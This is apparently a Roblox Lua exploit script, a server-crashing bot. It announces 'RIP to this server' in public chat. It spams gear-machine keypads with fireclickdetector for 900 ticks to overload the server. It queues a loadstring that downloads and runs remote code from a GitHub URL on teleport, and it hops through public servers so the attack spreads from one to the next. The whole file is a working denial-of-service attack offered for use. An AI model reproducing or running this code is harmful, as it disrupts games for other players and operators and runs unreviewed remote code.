local PlaceID = game.PlaceId
local AllIDs = {}
local foundAnything = ""
local actualHour = os.date("!*t").hour
local Deleted = false
local File = pcall(function()
    AllIDs = game:GetService('HttpService'):JSONDecode(readfile("NotSameServers.json"))
end)
if not File then
    table.insert(AllIDs, actualHour)
    writefile("NotSameServers.json", game:GetService('HttpService'):JSONEncode(AllIDs))
end
function TPReturner()
    local Site;
    if foundAnything == "" then
        Site = game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. PlaceID .. '/servers/Public?sortOrder=Asc&limit=100'))
    else
        Site = game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. PlaceID .. '/servers/Public?sortOrder=Asc&limit=100&cursor=' .. foundAnything))
    end
    local ID = ""
    if Site.nextPageCursor and Site.nextPageCursor ~= "null" and Site.nextPageCursor ~= nil then
        foundAnything = Site.nextPageCursor
    end
    local num = 0;
    for i,v in pairs(Site.data) do
        local Possible = true
        ID = tostring(v.id)
        if tonumber(v.maxPlayers) > tonumber(v.playing) then
            for _,Existing in pairs(AllIDs) do
                if num ~= 0 then
                    if ID == tostring(Existing) then
                        Possible = false
                    end
                else
                    if tonumber(actualHour) ~= tonumber(Existing) then
                        local delFile = pcall(function()
                            delfile("NotSameServers.json")
                            AllIDs = {}
                            table.insert(AllIDs, actualHour)
                        end)
                    end
                end
                num = num + 1
            end
            if Possible == true then
                table.insert(AllIDs, ID)
                wait()
                pcall(function()
                    writefile("NotSameServers.json", game:GetService('HttpService'):JSONEncode(AllIDs))
                    wait()
                    game:GetService("TeleportService"):TeleportToPlaceInstance(PlaceID, ID, game.Players.LocalPlayer)
                end)
                wait(4)
            end
        end
    end
end

function Teleport()
    while wait() do
        pcall(function()
            TPReturner()
            if foundAnything ~= "" then
                TPReturner()
            end
        end)
    end
end
local args = {
    [1] = "made by evilionx3, RIP to this server",
    [2] = "All"
}

game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
queueteleport = (syn and syn.queue_on_teleport) or queue_on_teleport or (fluxus and fluxus.queue_on_teleport)
queueteleport("loadstring(game:HttpGet("https://raw.githubusercontent.com/n0raxd/crash-bot/refs/heads/main/ggs.luau"))()")
-- shitty game security lmfao
local function findGearMachineKeypads()
    local keypads = {}

    -- Recursive function to search within services or models
    local function search(container)
        for _, object in ipairs(container:GetChildren()) do
            if object:IsA("Model") and object.Name == "Gear Machine" then
                local keypad = object:FindFirstChild("Keypad") -- Adjust "Keypad" if needed
                if keypad then
                    table.insert(keypads, keypad)
                end
            end

            if object:IsA("Model") or object:IsA("Folder") then
                search(object)
            end
        end
    end

    -- Search relevant containers
    search(game.Workspace)
    search(game.ReplicatedStorage)
    search(game.ServerStorage)

    return keypads
end

-- Get all keypads from Gear Machines
local foundKeypads = findGearMachineKeypads()

-- Print and store keypads globally for debugging purposes
for index, keypad in ipairs(foundKeypads) do
    _G["keypad" .. index] = keypad
    print("keypad" .. index .. ": " .. keypad:GetFullName())
end

-- Variable to keep track of the current keypad being processed
local currentKeypad

-- Function to simulate typing on the keypad
function typegear(inputValue)
    if not currentKeypad then
        warn("No keypad selected.")
        return
    end

    for i = 1, #inputValue do
        local buttonName = inputValue:sub(i, i) -- Extract each character
        local button = currentKeypad:FindFirstChild(buttonName) -- Find the button by name

        if button then
            local clickDetector = button:FindFirstChild("RangeC") -- Adjust "RangeC" if needed

            if clickDetector then
                fireclickdetector(clickDetector) -- Fire the click detector
                print("Clicked button '" .. buttonName .. "' on keypad: " .. currentKeypad.Name)
            else
                warn("Click detector 'RangeC' not found in button " .. buttonName)
            end
        else
            warn("Button named '" .. buttonName .. "' not found in the keypad.")
        end
    end
end

-- Process all keypads found
for _, keypad in ipairs(foundKeypads) do
    currentKeypad = keypad -- Set the current keypad
    fireclickdetector(keypad:FindFirstChild("Clear"):FindFirstChild("RangeC"))
    typegear("6418277837") -- Example input sequence, replace with your own
end
local RunService = game:GetService("RunService")
local loopCount = 0 -- Counter to track the number of iterations
local maxLoops = 900 -- Maximum number of loops to run

local connection
connection = RunService.Heartbeat:Connect(function()
    if loopCount >= maxLoops then
        connection:Disconnect() -- Disconnect the loop after 500 iterations
        print("Loop executed 500 times. Rip server")
Teleport()
        return
    end

    for _, keypad in ipairs(foundKeypads) do
        fireclickdetector(keypad:FindFirstChild("Enter"):FindFirstChild("RangeC"))
    end

    loopCount += 1 -- Increment the counter
end)
